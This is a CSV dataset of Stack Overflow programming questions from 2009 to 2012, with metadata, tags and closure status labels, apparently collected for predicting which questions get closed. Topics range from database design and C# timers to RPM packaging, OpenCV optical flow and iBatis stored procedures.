PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
6545602,07/01/2011 08:43:23,655293,03/11/2011 11:59:08,14,1,handling big apllications and big databases,"I allready have programmed some small applications, the database design was simple, just one normalized database containing all the datas I need for the application.

Now I want to try to programm something bigger:

There should be 4 websites build with MVC3. All the websites should use only one SQL-Membership-Database and some tables like contacts and so on should be shared between the diferent pages too.

**Now my question is: how to start?** 

**1.** Should I use one database for all the tables (each application needs up to 40 different tables) including the shared tables like the SQL-Membership-Database or should I create one database for Shared Data, one for Application 1, one for Application 2 and so on?

**2.** Should I put all the Applications into one MVC3-application and just seperate them by using areas?

**3.** All the applications need to save text and pictures, should I use one Table for pictures from Application 1/2/3... and choose them by an application ID or should I create a image-table for each application (same question for texts and descriptions and tooltipps...)?

**4.** My idea was to work woth blob (MS sql 2008 R2) to save files, do you think a good choice? 

Is there anyone who have got tipps ore experiances in creating huge (for me its huge ;-)) applications like this?

lot of thanks and greetings HW",sql-server,database,sql-server-2008,asp.net-mvc-3,asp.net-mvc-3-areas,10/25/2011 17:13:28,not a real question
5696053,04/17/2011 19:58:02,586687,01/23/2011 21:18:27,67,1,turn on computer since c# and execute my program when computer turn on? how to do it?,"well i am developing a simple program (for me) it is for anote notes, you put a day and a time to your note, when it was the time and day, it appears a ballontip,  
i have a problem here to, any time i put to this ballontip, it ever get to be only 5 secunds

 

    DateTime hora;
                DataTable tabla = daonota.seleccionaraahora();
                if (tabla.Rows.Count == 1)
                {
    
                    hora  =Convert.ToDateTime( tabla.Rows[0][4].ToString());
                    string titulo = tabla.Rows[0][1].ToString();
                    String texto = tabla.Rows[0][2].ToString();
                    texto=texto+""\nFecha programada=""+tabla.Rows[0][3].ToString();
                    texto = texto + ""\nHora programada="" + tabla.Rows[0][4].ToString();
                    notifyIcon1.ShowBalloonTip(10000, titulo, texto, ToolTipIcon.Info);
                  
                }

i have this code in a timer (timer1) it do a query every secund, do you know any form better for to do it (goal is it appears a ballon tip in the time put)

well i want to to ... if the computer is turn off, it turn on, any code for to do it since c#? and another thing... how do i do, my program is execute since the computer turn on, automatically?

",c#,c#-4.0,c#-3.0,c#-2.0,c#-to-vb.net,04/18/2011 00:58:00,not a real question
1957172,12/24/2009 07:11:05,95642,04/24/2009 17:59:07,16,5,Using installed gems in Ruby with 'require',I do something like `sudo gem install json`. Then I do `irb`. Then I do `require 'json'`. Then it says `no such file to load -- json`,ruby,gem,,,,,open
6477406,06/25/2011 11:22:40,676829,03/25/2011 13:44:41,31,0,performance issue,"Our is a considerably big project developed in Asp.Net 2.0 Web forms (Three layer architecture). The project consitutes of;

    * separate Class Library for each module (thus the count for web site is more)
    * Class having a const for each stored procedure name
    * multiple .resx files to store keep value pairs + separate Class Library to fetch data from them
    * separate class Library to fetch values from Web.config appsettings
    * enterprise library to avoid passing stored procedure parameter names
    * Assignment of href for anchors at run time
    * Thus lengthy call stack for all operations

Is it so above one or multiple things are causing the web site to run slow.

Suggestions will be highly appreciated.

thanks in advance
",performance,,,,,06/25/2011 11:45:39,too localized
7166070,08/23/2011 18:54:06,235708,12/21/2009 00:29:15,3900,248,Filter out Facebook Contacts from the Contact Picker,"I have a contact picker in my application that keeps crashing when a facebook contact is selected. I won't have the code I'm using to open the picker in front of me, but I believe I'm accessing the contacts through a call similar to this:

    new Intent(Intent.ACTION_PICK, People.CONTENT_URI)

Does anyone have experience with this? ",android,android-contacts,contactscontract,,,,open
10207998,04/18/2012 11:00:57,777283,05/31/2011 08:02:34,18,3,simple edit on an open java source project in eclipse not taking effect,"i'm trying to edit a java open source project... the project is in eclipse consisting of 10 packages with an average of 8 classes each, two jar files etc... the project have classes for socket connection with client, saving info to mysql database, querying and doing computation on data and doing an output-simulator in a ui with google maps. My main goal is to try to edit the computation of data to achieve better results. When i try to edit the classes concerned on the input socket connection, i can see in the printout in the console that it is being changed and saved and executed and printed out. My problem is when i try to edit the succeeding classes in eclipse, like a simple edit on the printout string , the edit will not be shown in the console or the command prompt. It will still show the previous string before i changed it. Why are simple edits not being implemented in the project. I cannot move on to changing the computation since simple edit on the printout string will not be implemented. I'm still a java newbie so i definitely need your input please. thnks",java,javascript,eclipse,,,,open
7814202,10/18/2011 21:51:34,218121,11/24/2009 20:48:33,147,23,Oracle: Retrieve by TZNAME,"How can we find out which TZNAME we are under in our Database?

If we do a 

    select dbtimezone from dual

I get dbtimezone = -04:00

we retrieve the DBTIMEZONE which is the number representation of the timezone, but since there are many of them but in different places, we won't be able to be 100 % accurate. Example, currently we have -04:00 which can be Both EST CANADA and EST NY (or a date that doesn't involve daylights savings)

Is there any way to retrieve the actual TZNAME of the database timezone rather than the actual time?

Thank you",oracle,,,,,,open
8889226,01/17/2012 03:12:40,1118140,12/27/2011 18:59:54,24,0,How can I parse an XML file given it's path in Jquery?,"So I am trying to parse a XML file that a user choose through a file chooser. The problem I am having is on my input change event, the jquery is not being call.

    $('input[type=file]').change(function(e){
		path = $(this).val();
		
		$.ajax({
		    type: ""GET"",
		    url: path,
		    dataType: ""xml"",
		    success: parseXml
		  });
   });

function parseXml(xml)
{

	head = xml;
	alert('I reached here');
}


 ",javascript,jquery,html,,,,open
10291892,04/24/2012 04:50:05,1352825,04/24/2012 04:43:59,1,0,Segue to Tab Bar Controller,"I have this problem:

I have an app that has 2 parts, the first part is when it's the first time the user opens the app, a screen with ""whats your name"" appears and he follows to a screen that has some buttons and it ends in a tableview where he can press a button in the footer to go to the other part of the app that is a view controller with 2 buttons: 1 - Go back to that first button screen (after whats your name), 2 - Go to tab bar controller. My problem is:  when I segue to the tab bar controller 2 navigation bar's appear oO. I've read through the internet that I can't push a tab bar controller into a navigation stack, is that true? 

So what is the solution for my UI? Since I want the user to be able to go back to that test screen, but I want to use this tab bar controller as well.


Thanks in advance!",objective-c,ios,user-interface,uitabbarcontroller,segue,,open
4190564,11/16/2010 02:00:51,316597,04/14/2010 14:27:47,1,1,Restlet On Android - Issues with serialization ,"I am trying to retrieve serialized classes using Restlet 2.1 with Android as the client and GAE as the server. This is the relevant code:

    ClientResource cr = new ClientResource(""http://localhost:8888/mydata"");
    // Get the MyData object
    MyDataResource resource = cr.wrap(MyDataResource.class);
    MyData myData = resource.retrieve();

I initially tested this in a standalone JSE class, and everything worked fine.
When I try to run the same thing in Android, the myData object is null. Any ideas? ",java,android,serialization,restlet,deserialization,,open
3603754,08/30/2010 19:55:23,162265,08/24/2009 19:55:44,8,0,RPM PHP and PEAR Packages,"I'm trying to package a custom build of the latest PHP (5.3.3) with a set of pear packages.  Unfortunately, the options given to do this don't seem to work.  I'm posting the spec file as I see it should be.  The version given doesn't actually fail, but it installs the PEAR packages in the wrong location.  While they should go in /var/tmp/my_php-5.3.3-1-buildroot/usr/local/lib/php, but they end up in /var/tmp/my_php-5.3.3-1-buildroot/var/tmp/my_php-5.3.3-1-buildroot/usr/local/lib/php.

You can also see where I had to hack the pearcmd.php script because it was completely ignoring the include_path setting the pear command passed it (derived from the PHP_PEAR_INSTALL_DIR environment variable).  This could be completely wrong, but it's the only way I could get it to actually install anything at all.

I have tried many other variations of this spec, but they all seem to ""fail"" in their own way.  FYI, I've also tried using Pyrus, but it had similar issues (in addition to issues with non-PEAR2 packages).

    %define PHP_PREFIX  /usr/local
    %define CONF_PREFIX /home/config/php/conf
    %define APXS_PATH   /usr/local/apache2/bin/apxs
    %define ORCL_PATH   /usr/local/lib/oracle
    
    %define PHP         %{PHP_PREFIX}/bin/php
    %define PEAR        %{PHP_PREFIX}/bin/pear
    %define PEAR_ROOT   %{PHP_PREFIX}/lib/php
    
    %define PHP_INSTALL       $RPM_BUILD_ROOT%{PHP}
    %define PEAR_INSTALL      $RPM_BUILD_ROOT%{PEAR}
    %define PEAR_ROOT_INSTALL $RPM_BUILD_ROOT%{PEAR_ROOT}
    
    %define PEARCMD %{PEAR_ROOT_INSTALL}/pearcmd.php
    %define PECLCMD %{PEAR_ROOT_INSTALL}/peclcmd.php
    
    %define _unpackaged_files_terminate_build 0
    
    Summary: my_php package
    Name: my_php
    Version: 5.3.3
    Release: 1
    License: The PHP License, Version 3.01
    Vendor: Me
    Packager: Me <me@blah.com>
    Group: Development/Languages
    BuildRoot: %{_tmppath}/%{name}-%{version}-%{release}-buildroot
    Source0: php-%{version}.tar.bz2
    Requires: my_httpd >= 2.2.0, oracle-instantclient >= 10.2.0.4
    BuildRequires: my_httpd >= 2.2.0
    Conflicts: php, php5
    
    %description
    PHP, My style
    
    %prep
    %setup -q -n php-%{version}
    
    %build
    LIB_DIR=""lib""
    
    if [ ""%{_arch}"" == ""x86_64"" ]; then
      LIB_DIR=""lib64""
    fi
    
    ./configure \
      --prefix=%{PHP_PREFIX} \
      --with-libdir=${LIB_DIR} \
      --with-pear \
      --with-config-file-path=%{CONF_PREFIX} \
      --with-apxs2=%{APXS_PATH} \
      --with-oci8=instantclient,%{ORCL_PATH} \
      --with-mysql \
      --with-pgsql \
      --enable-sockets \
      --with-gd \
      --enable-gd-native-ttf \
      --with-freetype-dir \
      --with-curl \
      --with-bz2 \
      --with-zlib-dir \
      --enable-exif \
      --with-ldap \
      --with-gmp \
      --with-xsl
    
    make clean
    make -j
    
    %install
    rm -rf $RPM_BUILD_ROOT
    
    # Don't try to change httpd.conf
    mv Makefile Makefile.bak
    sed -e ""s:&& \$(mkinstalldirs) '\$(INSTALL_ROOT)/.\+' \(&& %{APXS_PATH} .\+\)-S SYSCONFDIR='.\+' \(.\+\)-a \(.\+\):\1\2\3:"" Makefile.bak > Makefile
    
    # Install PHP to rpm staging area
    make INSTALL_ROOT=$RPM_BUILD_ROOT install
    
    # Modify *cmd.php to use correct include_path
    mv %{PEARCMD} %{PEARCMD}.bak
    mv %{PECLCMD} %{PECLCMD}.bak
    sed -e ""s:'@'.'include_path'.'@':'%{PEAR_ROOT}':"" %{PEARCMD}.bak > %{PEARCMD}
    sed -e ""s:'@'.'include_path'.'@':'%{PEAR_ROOT}':"" %{PECLCMD}.bak > %{PECLCMD}
    
    # Install PEAR packages to rpm staging area
    export PHP_PEAR_PHP_BIN=""%{PHP_INSTALL}""
    export PHP_PEAR_INSTALL_DIR=""%{PEAR_ROOT_INSTALL}""
    
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/MDB2-beta
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/MDB2_Driver_oci8-beta
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/MDB2_Driver_pgsql-beta
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/MDB2_Driver_mysql-beta
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/Mail
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/Mail_Mime
    %{PEAR_INSTALL} install -P $RPM_BUILD_ROOT pear/Spreadsheet_Excel_Writer-beta
    
    # Revert *cmd.php
    mv %{PEARCMD}.bak %{PEARCMD}
    mv %{PECLCMD}.bak %{PECLCMD}
    
    %files
    %defattr(-,root,root)
    /
    
    %clean
    rm -rf $RPM_BUILD_DIR/php-%{version} $RPM_BUILD_ROOT

Thanks for any help!
",php,pear,rpm,,,,open
9909407,03/28/2012 14:16:14,695697,04/06/2011 21:59:24,427,16,retrieving database result,"Can someone explain why do we need to do `java: while rs.next()` , `php: while ($result = mysql_fetch_array)` ? How does programming languages retrieve data from database. What happens ? Why doesn't reveice the whole response ?

I don't know but I really can't understant this , is way to nasty . 

I need a documentation not just ""because they do that""

Thanks",java,php,mysql,sql,,03/28/2012 15:41:46,not a real question
11468929,07/13/2012 10:44:08,1289480,03/24/2012 03:28:56,6,0,Is there any way to find end tag in xml using vtd-xml,"I have use token to loop all element based on the token count
and see that in my xml structure, it has only token type = 5 and token type = 0 from this web

http://vtd-xml.sourceforge.net/userGuide/6.html

So is there a way to find ending tag in vtd-xml",xml,tags,vtd-xml,,,,open
8048336,11/08/2011 09:33:34,1021661,10/31/2011 09:08:35,95,10,"What is Association,Aggregation,Composition,Delegation,Realization,Dependency?","I am so confuse in ""Association,Aggregation,Composition,Delegation,Realization,Dependency""...
please explain these all terms in detail with example.
Thanks in advance ..

**Edited**

I want to learn it from basic.
",java,associations,composition,aggregation,delegation,11/08/2011 18:36:06,not constructive
11495329,07/15/2012 20:23:35,1080599,12/04/2011 22:29:33,22,0,Is there an open source Q&A platform similar to stackoverflow?,I need a good open source Q&A platform to boost collective intelligence of my community. The stackoverflow workflow is perfect for me. Do you know of any similar platform?,platform,,,,,07/15/2012 20:29:34,off topic
7045173,08/12/2011 19:11:21,888866,08/10/2011 22:21:44,6,0,Lost of precision warning flags,"A simple code:

int generated;
    
    generated = (random() % 100) + 1;

gives a warning flag for loss of precision, 'long' to 'int', so I have been correcting it by rewriting the assignment code as:
    
    generated = ((int)random() % 100) + 1;

Is this a valid way of correcting the problem or am I just covering up errors elsewhere?  Thanks",objective-c,learning,,,,,open
6984490,08/08/2011 15:25:41,637034,02/28/2011 01:56:34,82,4,"how to measure the io performance of a hard disk, such as throughput, iops, sequential/random read/write speed, etc","Some guys said <a href=""http://www.textuality.com/bonnie/"">bonnie</a> and <a href=""http://www.iometer.org/"">iometer</a>, any suggestions?<br><br>
I need to test the performance under linux at first, then maybe under windows. Which one is easier to use? And if it can generate readable results, it will be good.<br><br>
Or some other tools to use? Or just some linux commands or scripts?",windows,linux,performance,io,hardware,08/08/2011 17:10:42,off topic
8648011,12/27/2011 18:34:55,1118094,12/27/2011 18:19:45,1,0,How to know if the movement is vertical? (using Optical Flow from OpenCV ),"I'm quite new to Image Processing and I have this problem:
I need to detect blinks real-time, and I have made it by an online template matching following some papers/guidelines. It works great but the template match also goes down when the eyes look in another direction.

So I would like to know if the movement tracked is mostly vertical (or downwards) to confirm that 2 eyes have blinked and not just looked in another direction.

PS: I'll keep the template match part of my project :-)

I'm using a sample code of OpticalFlow and it works good.
This is the code using ""cvCalcOpticalFlowPyrLK"" (even if it's java I can use C functions of opencv with JavaCV wrappers)

    public class OpticalFlowTracker {
    private static final int MAX_CORNERS = 500;

    public static void main(String[] args) {
        // Load two images and allocate other structures
        IplImage imgA = cvLoadImage(""/home/dario/Desktop/image0.png"", CV_LOAD_IMAGE_GRAYSCALE);
        IplImage imgB = cvLoadImage(""/home/dario/Desktop/image1.png"", CV_LOAD_IMAGE_GRAYSCALE);

        CvSize img_sz = cvGetSize(imgA);
        int win_size = 15;
        
        IplImage imgC = cvLoadImage(""/home/dario/Desktop/image0.png"", CV_LOAD_IMAGE_UNCHANGED);
        
        // Get the features for tracking
        IplImage eig_image = cvCreateImage(img_sz, IPL_DEPTH_32F, 1);
        IplImage tmp_image = cvCreateImage(img_sz, IPL_DEPTH_32F, 1);

        int[] corner_count = { MAX_CORNERS };
        CvPoint2D32f cornersA = new CvPoint2D32f(MAX_CORNERS);

        CvArr mask = null;
        cvGoodFeaturesToTrack(imgA, eig_image, tmp_image, cornersA,
                corner_count, 0.05, 5.0, mask, 3, 0, 0.04);

        cvFindCornerSubPix(imgA, cornersA, corner_count[0],
                cvSize(win_size, win_size), cvSize(-1, -1),
                cvTermCriteria(CV_TERMCRIT_ITER | CV_TERMCRIT_EPS, 20, 0.03));

        // Call Lucas Kanade algorithm
        byte[] features_found = new byte[MAX_CORNERS];
        float[] feature_errors = new float[MAX_CORNERS];

        CvSize pyr_sz = cvSize(imgA.width() + 8, imgB.height() / 3);

        IplImage pyrA = cvCreateImage(pyr_sz, IPL_DEPTH_32F, 1);
        IplImage pyrB = cvCreateImage(pyr_sz, IPL_DEPTH_32F, 1);

        CvPoint2D32f cornersB = new CvPoint2D32f(MAX_CORNERS);
        cvCalcOpticalFlowPyrLK(imgA, imgB, pyrA, pyrB, cornersA, cornersB,
                corner_count[0], cvSize(win_size, win_size), 5,
                features_found, feature_errors,
                cvTermCriteria(CV_TERMCRIT_ITER | CV_TERMCRIT_EPS, 20, 0.3), 0);

        // Make an image of the results
        for (int i = 0; i < corner_count[0]; i++) {
            if (features_found[i] == 0 || feature_errors[i] > 550) {
                System.out.println(""Error is "" + feature_errors[i] + ""/n"");
                continue;
            }
            System.out.println(""Got it/n"");
            cornersA.position(i);
            cornersB.position(i);
            CvPoint p0 = cvPoint(Math.round(cornersA.x()),
                    Math.round(cornersA.y()));
            CvPoint p1 = cvPoint(Math.round(cornersB.x()),
                    Math.round(cornersB.y()));
            cvLine(imgC, p0, p1, CV_RGB(255, 0, 0), 
                    2, 8, 0);
        }

        cvSaveImage(""/home/dario/Desktop/image0-1.png"", imgC);
        cvNamedWindow( ""LKpyr_OpticalFlow"", 0 );
        cvShowImage( ""LKpyr_OpticalFlow"", imgC );
        cvWaitKey(0);
    }
    }",java,opencv,motion-detection,opticalflow,,,open
11528680,07/17/2012 18:32:56,1514980,07/10/2012 13:52:47,3,0,Poor coefficients created from nonlinearmodelfit in mathematica,"I am working with nonlinearmodelfit in mathematica, and I am creating a formula with 5 unknowns and 9 coefficients. I am giving it over 20 data points, so that should be creating decent results. Most of the results seem alright, but one of my coefficients, e, is off. It varries a lot between formulaes, and it should be close to .3 Here is the function I am using:
    
    nlm = NonlinearModelFit[
    data, {a + c*b + d*bminv + e*M + f*bminv*M + g*x + h*x^2 + k*y + 
    l*y^2}, {a, c, d, e, f, g, h, k, l}, {b, bminv, M, x, y}, 
    Weights -> 1/temperrors^2]

I have tried using the initial guess thing, and put in {e,.3} in the section with the coefficients, but that doesnt seem to work, and I do not quite understand what it would do anyways.
I have also tried to add constraints to the equation where the coefficient e must be between .3 and .4 but that doesnt work well either.

If anybody has some advice as to how to better adjust my coefficient outcome that would be much appreciated.

Thanks.",mathematica,modeling,nonlinear-functions,,,07/17/2012 19:25:26,off topic
10197196,04/17/2012 18:48:47,1339509,04/17/2012 18:31:48,1,0,how can i make a javascript form wizard in muilt pages with a next and cancel and back and submit the last page,"i am creating a javascript form wizard with muilt pages in my website
with a next and cancel and back and submit on the last page

i tried google but it shows one page form wizards

please can you help me on this

",javascript,wizard,,,,04/19/2012 11:50:02,not a real question
9587458,03/06/2012 16:09:22,684070,07/01/2010 17:47:41,85,8,Using NSRegularExpression to extract URLs on the iPhone,"I'm using the following code on my iPhone app, taken from http://tinyurl.com/remarkablepixels to extract all URLs from striped .html code.

I'm only being able to extract the first URL, but I need an array containing **all** URLs. My NSArray isn't returning NSStrings for each URL, but the objects descriptions only.

How do I make my `arrayOfAllMatches` return all URLs, as NSStrings?

    -(NSArray *)stripOutHttp:(NSString *)httpLine {

    // Setup an NSError object to catch any failures
	NSError *error = NULL;	

    // create the NSRegularExpression object and initialize it with a pattern
    // the pattern will match any http or https url, with option case insensitive

	NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@""http?://([-\\w\\.]+)+(:\\d+)?(/([\\w/_\\.]*(\\?\\S+)?)?)?"" options:NSRegularExpressionCaseInsensitive error:&error];

    // create an NSRange object using our regex object for the first match in the string httpline
	NSRange rangeOfFirstMatch = [regex rangeOfFirstMatchInString:httpLine options:0 range:NSMakeRange(0, [httpLine length])];

    NSArray *arrayOfAllMatches = [regex matchesInString:httpLine options:0 range:NSMakeRange(0, [httpLine length])];

    // check that our NSRange object is not equal to range of NSNotFound
	if (!NSEqualRanges(rangeOfFirstMatch, NSMakeRange(NSNotFound, 0))) {
        // Since we know that we found a match, get the substring from the parent string by using our NSRange object

		NSString *substringForFirstMatch = [httpLine substringWithRange:rangeOfFirstMatch];

		NSLog(@""Extracted URL: %@"",substringForFirstMatch);
        NSLog(@""All Extracted URLs: %@"",arrayOfAllMatches);

        // return all matching url strings
		return arrayOfAllMatches;
	}
    
	return NULL;
}

Here is my NSLog output:

    Extracted URL: http://mydomanin/myplayer    
    All Extracted URLs: (
        ""<NSExtendedRegularExpressionCheckingResult: 0x106ddb0>{728, 53}{<NSRegularExpression: 0x106bc30> http?://([-\\w\\.]+)+(:\\d+)?(/([\\w/_\\.]*(\\?\\S+)?)?)? 0x1}"",
        ""<NSExtendedRegularExpressionCheckingResult: 0x106ddf0>{956, 66}{<NSRegularExpression: 0x106bc30> http?://([-\\w\\.]+)+(:\\d+)?(/([\\w/_\\.]*(\\?\\S+)?)?)? 0x1}"",
        ""<NSExtendedRegularExpressionCheckingResult: 0x106de30>{1046, 63}{<NSRegularExpression: 0x106bc30> http?://([-\\w\\.]+)+(:\\d+)?(/([\\w/_\\.]*(\\?\\S+)?)?)? 0x1}"",
        ""<NSExtendedRegularExpressionCheckingResult: 0x106de70>{1129, 67}{<NSRegularExpression: 0x106bc30> http?://([-\\w\\.]+)+(:\\d+)?(/([\\w/_\\.]*(\\?\\S+)?)?)? 0x1}""
    )
    
     ",objective-c,regex,nsstring,nsarray,nsregularexpression,,open
5698080,04/18/2011 02:57:30,710159,04/14/2011 02:03:17,1,1,introspection in obj c,"@interface class:nsobject
@property(copy)nsstring*author;
@end
interface class2:class
@property float framespersecond;  //cannot find interface declaration for 'class',superclass of 'class2' 
@end
@implementation class
@synthesize author;
@end
@implementation class
@synthesize framespersecond ;
@end

This is written in main.m
	-(id) currentobject     // currentobject undeclared
	{
		return[[[class2 alloc]init]autorelease];
		
	}
	-(void)checkObjectType {
		id object = [self currentObject];
		class class = [introclass class];
		BOOL isclass = [object isMemberOfClass:class];
		BOOL isclassOrsubclass = [object isKindOfClass:class];
		
		if (isintroclass) {
			NSLog(@""object is an instance of class"");
			
		}
		if (isclassOrsubclass) {
			NSLog(@""object is an instance of class or a subclass"");
		}
	
	}



",objective-c,,,,,04/18/2011 03:29:18,not a real question
7537342,09/24/2011 05:58:41,962317,09/24/2011 05:56:36,1,0,Error converting to int,"EditText txtDistance = (EditText)findViewById(R.id.Distance);
		int distance = (txtDistance.getText().toInt());
		
",java,eclipse,android-2.2,,,09/24/2011 23:00:13,not a real question
4091786,11/03/2010 21:17:25,496497,11/03/2010 21:17:25,1,0,Ibatis Ref Curosr issue with Oracle,"I'm using Java and Ibatis to call a stored procedure on on oracle database. I seem to be having an issue setting up with parameters. 


The store procedure looks like the following:

   

    PROCEDURE Get_Semployees_By_Clt_ID
        (
            client_id IN HRIS.SEMPLOYEES.SEE_CLT_ID%TYPE,    
            ref_cursor OUT SYS_REFCURSOR
        );

My Ibatis SqlMap:

    <sqlMap namespace=""Foo"">
      
    
    <resultMap id=""employee-map"" class=""MyFoo"">  
       <result property=""foo1"" column=""foo1""/>  
       <result property=""foo2"" column=""foo2""/>  
    </resultMap>   
        
    <parameterMap id=""clientEmployeesParms"" class=""java.util.Map"" >
        <parameter property=""in1"" jdbcType=""INTEGER"" javaType=""java.lang.Integer"" mode=""IN""/>
        <parameter property=""output1"" jdbcType=""ORACLECURSOR"" javaType=""java.sql.ResultSet""    mode=""OUT"" />
    </parameterMap>
        
        <procedure id=""clientEmployees"" parameterMap=""clientEmployeesParms"" resultMap=""employee-map"">
        { call Package.Get_Clt_ID(?,?) }
        </procedure>
    
    </sqlMap>

My Java:

    resource = ""SqlMapConfig.xml"";
    reader = Resources.getResourceAsReader (resource);
    sqlMap = SqlMapClientBuilder.buildSqlMapClient(reader);
    Map map = new HashMap();
    map.put(""in1"", new Integer(23));
    list = sqlMap.queryForList(""Foo.clientEmployees"", map);

Error:

    --- The error occurred while applying a parameter map.  
    --- Check the Employee.clientEmployeesParms.  
    --- Check the output parameters (retrieval of output parameters failed).  
    --- Cause: java.lang.NullPointerException
    Caused by: java.lang.NullPointerException
     at com.ibatis.sqlmap.engine.mapping.statement.GeneralStatement.executeQueryWithCallback(GeneralStatement.java:188)
     at com.ibatis.sqlmap.engine.mapping.statement.GeneralStatement.executeQueryForList(GeneralStatement.java:123)
     at com.ibatis.sqlmap.engine.impl.SqlMapExecutorDelegate.queryForList(SqlMapExecutorDelegate.java:610)
     at com.ibatis.sqlmap.engine.impl.SqlMapExecutorDelegate.queryForList(SqlMapExecutorDelegate.java:584)
     at com.ibatis.sqlmap.engine.impl.SqlMapSessionImpl.queryForList(SqlMapSessionImpl.java:101)
     at com.ibatis.sqlmap.engine.impl.SqlMapClientImpl.queryForList(SqlMapClientImpl.java:78)
     at com.apache.struts.employee.model.IbatisStoredProcedure.main(IbatisStoredProcedure.java:30)


 
",java,oracle10g,ibatis,,,,open
11526868,07/17/2012 16:28:59,470879,10/09/2010 06:09:16,3334,53,Force genstrings to build the Localizable.strings file in order of appearance rather than alphabetically,"I'm new to internationalization and localization for iOS.  I'm running genstrings:
`find . -name \*.m | xargs genstrings -o en.lproj` to generate my Localizable.strings files.  It builds the file in alphabetical order (by key).

For ease of translation I'd prefer that the keys and values be ordered by their order of appearance in the .m files.  Is this possible with genstrings?  I couldn't find the relevant info on its `man` page.

",ios,cocoa-touch,localization,nslocalizedstring,genstrings,,open
5663930,04/14/2011 13:22:45,708039,04/14/2011 13:22:45,1,0,progress bar during sending a file,when sending file from client to server where should we add the code for progress bar?,java,progress,bar,,,04/14/2011 13:26:32,not a real question
6662191,07/12/2011 09:41:48,626590,02/21/2011 12:41:31,1,0,Happy Birthday Roger Planes,I'm try write my friend an application which says happy birthday what's the best way to write this to be run in the background and then pop-up around 5pm today...?,c#,asp.net,command-line,,,07/12/2011 09:49:11,not a real question
1092376,07/07/2009 13:34:47,15928,09/17/2008 13:34:46,117,4,what c# knowledge should I have?,"A very open question. I've been programming in C# for the past 5 months doing small projects that I completed successfully.
  
Today I went to an interview for a C# role. The 1st question was 'Tell me about boxing'. Given my experience I had no idea what the guy meant. Needless to say the interview didn't go that well. Others questions were 'why isn't it recommended to  use an ArrayList of int', 'tell me what you know about threading', etc.  
  
I don't really want this to happen again so I'm planning to spend some time reading (and practising) more on C#. I understand that the best way of learning is by coding but coding wouldn't have really helped me answer the question about 'boxing' for example.
  
I'm not asking you to answer the above technical questions. In fact, I know now their answer as I went straight to Google after the interview and it's how I realised that my C# knowledge is somewhat limited.
  
My question is: in your opinion, which knowledge should any C# developer have? Ideally it would be better if you could categorize it (Basic knwoledge anyone should have without exception, Advanced knowlege, Expert knowledge etc). No need to go into details. Doing research on whatever you list will be a good exercise for me.  

Thanks. ",c#,knowledge,,,,12/06/2011 02:45:35,off topic
6886861,07/31/2011 00:52:34,771318,05/25/2011 19:13:11,24,0,How to add a post to a tab in my blogger,"I am new to Blogging. I created a blog. I created a some tabs in the blog. 

  I followed these steps to create tabs.
1) I created some pages in the blog
2) in add gadgets i selected link lists and in the URL I gave URL of my pages which I created earlier.
3) Now I am able to see tabs.

 But now I would like to add a post a particular tab. 

How can I do it. 
Here is my blog: [http://software-interview-stuff.blogspot.com/][1]

In this link I posted a video which I would like to see under blogger tips and tricks tab.
Right now what ever i post it is under home tab.

Please help me


  [1]: http://software-interview-stuff.blogspot.com/",post,tabs,add,blogger,,08/01/2011 04:47:27,off topic
4420550,12/12/2010 05:40:39,367121,06/15/2010 10:13:00,41,0,How to calculate 100 Meter distance if latitude and longitude of a point is know ,I want to know if it is possible to calculate 100 meter distance around a given point with known latitude and longitude. I have some coordinates in MySql database. I want to know if a specific coordinate lies in 100 meter range from a given point. ,google-maps,gps,google-maps-markers,,,,open
4322234,12/01/2010 07:50:48,443244,09/07/2010 11:54:33,41,6,How to stop scrolling of Panel scrollbar when textBox is selected,"I am working on one windows form application.
I came across this small but irritating problem.

I am having panel called Panel1 in which all textBoxes are added.(around 12 textBoxes)

When I click into my textBox (one of the last textBoxes) to type in a value and as soon as i press the mouse button focus jumps to the textBoxes present above it or we can say scroll bar of the panel1 scrolls automatically and focus changes.

i tried many things but it is not working.

how can i stop scrolling of panel and jumping of focus ?

Please let me know if anybody has the solution for the problem.


Regards,

Thanks a lot.

",c#,winforms,visual-studio-2008,textbox,scrollbar,,open
